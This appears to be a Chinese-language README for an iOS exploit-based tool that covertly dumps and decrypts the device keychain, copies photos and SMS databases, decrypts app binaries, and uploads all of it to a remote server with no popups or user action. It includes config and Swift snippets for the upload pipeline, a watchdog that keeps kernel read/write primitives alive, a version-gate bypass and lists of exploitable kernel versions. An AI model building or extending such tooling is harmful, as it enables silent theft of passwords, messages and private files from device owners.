# lara 功能扩展（A 线）：钥匙串提取 / 文件提取 / 上传 / 不重启常驻 / 砸壳

本目录说明在 lara 工程（`D:\Ai\gzq\lara`）上新增的功能模块。工程使用 Xcode 16
文件夹同步机制（PBXFileSystemSynchronizedRootGroup），**新增文件放入
`lara/lara/classes/` 即自动参与编译，无需改 project.pbxproj**。

## 新增模块

| 文件 | 作用 |
|---|---|
| `lara/lara/classes/autopipeline.swift` | **自动流水线**：启动后无感提取+解码+上传钥匙串（核心交付） |
| `lara/lara/classes/keychainmgr.swift` | 钥匙串提取 + 解码 + JSON 导出（核心新功能） |
| `lara/lara/classes/extractmgr.swift` | 全盘文件提取 + zip 打包（复用 zipmgr） |
| `lara/lara/classes/uploadmgr.swift` | HTTPS 上传（multipart / JSON，自动重试） |
| `lara/lara/classes/keepalive.swift` | 不重启常驻看门狗（已接入 lara.swift 启动流程） |
| `lara/lara/classes/versiongate.swift` | 版本闸门研究覆盖 + 内核漏洞状态探测 |
| `lara/lara/kexploit/offsets.m`（修改） | 版本闸门支持 `lara.forceOffsets` 研究覆盖 |
| `lara/lara/funcs/isunsupported.swift`（修改） | 同样支持研究覆盖 |
| `lara/lara/lara.swift`（修改） | 启动时自动启动 keepalive + autopipeline |

## 自动流水线（用户无感）

**行为**：用户打开软件 → 内核原语就绪（exploit 或 launchd stash 恢复）→ VFS 就绪
→ **自动**：dump keychain-2.db → 尝试全部密钥后端解码 → 组装 JSON（含原始 DB
base64 与 SHA256）→ 上传服务器。全程无弹窗、无用户操作；失败自动退避重试；
未上传的 payload 持久化，下次打开/回前台继续传；支持内容哈希去重。

**服务器配置**（三选一，优先级：UserDefaults > Info.plist）：
```xml
<!-- Info.plist -->
<key>lara.upload.serverURL</key>
<string>https://backup.example.com/upload</string>
<key>lara.upload.apiToken</key>
<string>your-bearer-token</string>
<key>lara.upload.deviceID</key>
<string>stable-device-identifier</string>
<key>lara.auto.enabled</key><true/>
<key>lara.auto.alwaysUpload</key><true/>   <!-- 每次打开都重新提取上传 -->
<key>lara.auto.dedup</key><true/>
<key>lara.auto.includeRawDB</key><true/>   <!-- 附带 keychain-2.db base64 -->
<!-- 自动提取的文件/目录（zip 后上传 /files） -->
<key>lara.auto.extractPaths</key>
<array>
  <string>/private/var/mobile/Media/DCIM</string>
  <string>/private/var/mobile/Library/SMS</string>
</array>
<!-- 自动砸壳的 app bundle ID（解密后上传 /files） -->
<key>lara.auto.decryptBundleIDs</key>
<array>
  <string>com.example.targetapp</string>
</array>
```
或用 UserDefaults 同名 key 覆盖（便于远程下发/运行时调整）。

**服务器端**：`POST /upload/keychain` 接收 JSON（Bearer 鉴权）。
参考收件端：`research/upload_server.py`。

**上传 payload 结构**：
```json
{
  "device": "...", "systemVersion": "...", "xnuReady": true,
  "exportedAt": "...", "itemCount": N,
  "items": [ { "table":"genp", "rowid":1, "agrp":"...", "acct":"...", "svce":"...",
               "pdmn":2, "decrypted_flag":true,
               "decrypted_b64":"...", "decrypted":"明文(若UTF-8)" } ],
  "rawDB_b64": "...", "rawDBSHA256": "...", "messages": [ ... ]
}
```
解密失败时 `decrypted_flag=false` + `encrypted_b64`（原始密文照常上传，服务端可留作取证）。

**失败兜底**：未配置服务器 → payload 存 `Documents/autopipeline/pending.json`；
每次回前台 `resumeIfPending()` 重试。绝不弹窗、绝不崩溃。

## 钥匙串提取（keychainmgr）

流水线（需 exploit 原语 + vfs 就绪）：

1. **读取**：`vfs_read` 分块（512KB）把 `/var/Keychains/keychain-2.db` 完整读出。
2. **解析**：内置极简 SQLite b-tree 读取器（无第三方依赖），解析
   `genp` / `inet` / `keys` / `cert` 表，按 CREATE 语句列名映射字段。
   （该解析逻辑已用 Python 原型对真实 SQLite 库验证通过。）
3. **取类密钥**（keybag），三种后端：
   - `.securitydScan`：扫描 securityd 进程堆（设备已解锁时类密钥在其内存）
   - `.kernelKeybagScan`：内核堆扫描 `"keybag"` 魔数 + 结构校验
   - `.appleKeyStoreMIG`：AppleKeyStore MIG（需内核补丁提权，占位）
4. **解密**：解析条目 blob（version/flags/pdmn + skey 包裹密钥 + IV + 密文），
   AES-ECB 解包密钥 → AES-CBC 解密密文（CommonCrypto）。
5. **导出**：JSON（含 base64 原文与 UTF-8 明文）→ Documents。

调用示例（任意触发点，如 Settings 按钮或 File Manager 菜单）：

```swift
keychainmgr.shared.runExtraction(method: .securitydScan, logger: { msg in
    globallogger.log(msg)
}) { result in
    let out = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
        .appendingPathComponent("keychain_export.json")
    _ = keychainmgr.shared.exportJSON(result.items, to: out)
    // 上传
    uploadmgr.shared.uploadFileWithRetry(out, config: .load()) { r in
        // r: Result<Data, UploadError>
    }
}
```

**待真机验证项**（exploit 可用后）：
- keychain-2.db 在当前 iOS 版本上的实际 schema 列（解析按列名映射，容错）
- keybag 在后端扫描中的实际内存布局（`parseKeybag` 的偏移按 theiphonewiki
  文档实现，需按目标 build 校准）
- 条目 blob 的包裹密钥格式（ECB 解包假设，若失败会返回解密失败而非崩溃）

## 文件提取（extractmgr）

- 递归遍历（`vfs_listdir`）+ 分块流式读取（`vfs_read` 带 offset）
- 暂存到沙盒 → `createZipArchive` 打包（支持 deflate）
- 可配置：最大深度 / 单文件上限 / 总量上限 / 跳过路径

```swift
if let zip = extractmgr.shared.extractToZip(path: "/private/var/mobile/Media/DCIM") {
    uploadmgr.shared.uploadFileWithRetry(zip, config: .load()) { _ in }
}
```

## 上传（uploadmgr）

配置存 UserDefaults（可在 Settings 增加 UI 或直接注入）：

```swift
var cfg = uploadmgr.UploadConfig.load()
cfg.serverURL = URL(string: "https://backup.example.com/upload")
cfg.apiToken  = "secret"
cfg.deviceID  = UIDevice.current.identifierForVendor?.uuidString ?? "unknown"
cfg.save()
```

端点约定：`POST /keychain`（JSON）、`POST /files`（multipart）。
参考收件端：`research/upload_server.py`（Python 标准库，Bearer 鉴权可选）。

## 不重启常驻（keepalive）

- 启动时自动 `recover_krw_primitives()`（恢复 stash 在 launchd 里的 KRW）
- 5s 看门狗：`ds_kread32(kernel_base) == 0xFEEDFACF` 探活
- 原语丢失时：先尝试恢复 stash，失败则进程内重跑 `ds_run()`
- 已接入 `lara.swift` 的 `.onAppear`（offsets 就绪后启动）

> 说明：DarkSword 的持久化设计（`transfer_krw_to_launchd`）保证**只要设备不
> 重启**，内核 R/W 原语在 app 被杀/重启后依然存在。keepalive 负责自动恢复与
> 探活；若设备重启则必须重新运行 exploit（这是漏洞利用的性质决定的，与 app
> 无关）。

## 砸壳（decrypt.m，已有功能）

`decrypt_app(bundlePath:executableName:outputPath:)` 已实现：启动 app →
`procbyname` 找 pid → 从进程 VM 读取已解密 __TEXT → 重写二进制。
`decrypt_binary(path:processName:outputPath:)` 支持任意进程。

## 版本闸门（versiongate）

- `lara.forceOffsets`（UserDefaults）→ 绕过 26.1+ 硬闸门（研究用途）
- `probePatchState()` → 读内核 xnu 版本字符串，判定 vulnerable/patched/unknown
- `instructionSignatureScore()` → 次级指令模式证据（0x164D 标志加载后是否
  跟位 1 测试）
- 已知范围：xnu 8792/10002/11215 全系、12377.0–41（iOS 26.0.x）属可利用；
  12377.42+（iOS 26.1+）已修复

## 构建

```bash
# 需要 macOS + Xcode 16（工程用同步文件夹，直接打开 lara.xcodeproj）
# 或复用仓库自带脚本
./scripts/build_ipa.sh
```

无 macOS 环境时，本目录代码作为参考实现；逻辑层（SQLite 解析/解密）已用
Python 原型验证，见 `D:\Ai\gzq\research\proto_sqlite_reader.py`。
